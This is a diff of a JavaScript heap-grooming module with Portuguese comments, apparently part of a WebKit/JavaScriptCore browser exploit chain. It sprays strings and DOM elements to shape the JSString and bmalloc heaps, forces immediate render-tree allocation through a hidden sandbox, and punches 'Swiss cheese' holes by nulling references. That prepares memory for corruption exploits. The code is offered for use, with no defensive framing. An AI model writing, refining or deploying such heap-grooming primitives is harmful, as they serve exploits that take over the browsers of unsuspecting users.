@@ -1,50 +1,75 @@
 /**
- * MOD_GROOMER.JS — Manipulação Avançada de Heaps Específicos
- * Foco: JSString Heap, DOM bmalloc e criação de "Buracos" (Hole Punching)
+ * MOD_GROOMER.JS — Heap Manipulator (Versao 12.0 - DOM Nativo)
+ * Atualizado: Alocacao completa de objetos C++ no WebCore e encoding limpo.
  */
 
 export const Groomer = {
-    keepAlive: [],
+    trashStrings: [],
+    trashDOM: [],
 
-    // 1. JSString Heap Grooming
-    sprayStrings: function(size, count) {
-        let strings = [];
-        let base = "A".repeat(size);
+    sprayStrings: function(count, size = 1024) {
+        let trash = new Array(count);
+        
+        // Evita a otimizacao de Rope Strings do JSC
+        const baseStr = 'A'.repeat(size);
         for (let i = 0; i < count; i++) {
-            // O slice força o motor a alocar uma NOVA string na memória
-            strings.push((base + i.toString()).slice(0, size));
+            // Slice + concatenacao forca a criacao de um novo WTF::StringImpl na memoria C++
+            trash[i] = (baseStr + i.toString()).slice(0, size);
         }
-        return strings;
+        
+        this.trashStrings.push(trash);
+        return trash;
     },
 
-    // 2. DOM Node Grooming (bmalloc)
     sprayDOM: function(tag, count) {
-        let trash = [];
+        let trash = new Array(count);
+        
+        // 🚨 FIX CRITICO: Elementos orfaos nao criam RenderObjects pesados.
+        // Precisamos anexa-los a um sandbox real no documento.
         let sandbox = document.getElementById('groomer-sandbox');
         if (!sandbox) {
             sandbox = document.createElement('div');
             sandbox.id = 'groomer-sandbox';
-            sandbox.style.display = 'none';
+            // Sandbox invisivel para nao quebrar a interface visual do seu painel
+            sandbox.style.position = 'absolute';
+            sandbox.style.top = '-9999px';
+            sandbox.style.visibility = 'hidden';
             document.body.appendChild(sandbox);
         }
         
         for (let i = 0; i < count; i++) {
             let el = document.createElement(tag);
-            sandbox.appendChild(el); // FIX: Força a alocação completa no WebCore
-            trash.push(el);
+            
+            // Adicionar ID engorda o objeto no bmalloc
+            el.id = `groom_${tag}_${i}`;
+            sandbox.appendChild(el); 
+            
+            // 🚨 FIX CRITICO: Forca o WebKit a desenhar o elemento AGORA.
+            // Isso obriga a alocacao imediata do RenderStyle e RenderTree na RAM.
+            void el.offsetWidth; 
+            
+            trash[i] = el;
         }
+        
+        this.trashDOM.push(trash);
         return trash;
     },
 
-    // 3. O Clássico "Hole Punching" (Queijo Suíço)
     punchHoles: function(array, step = 2) {
+        // Metodo Queijo Suico: Cria buracos na memoria libertando referencias
         for (let i = 0; i < array.length; i += step) {
-            array[i] = null; // Cria o buraco
+            array[i] = null;
         }
-        this.keepAlive.push(array); 
     },
 
     cleanup: function() {
-        this.keepAlive = [];
+        this.trashStrings = [];
+        this.trashDOM = [];
+        
+        let sandbox = document.getElementById('groomer-sandbox');
+        if (sandbox) {
+            // Destroi a arvore do sandbox de uma vez para forcar o GC a varrer em bloco
+            try { sandbox.innerHTML = ''; } catch(e) {}
+        }
     }
 };
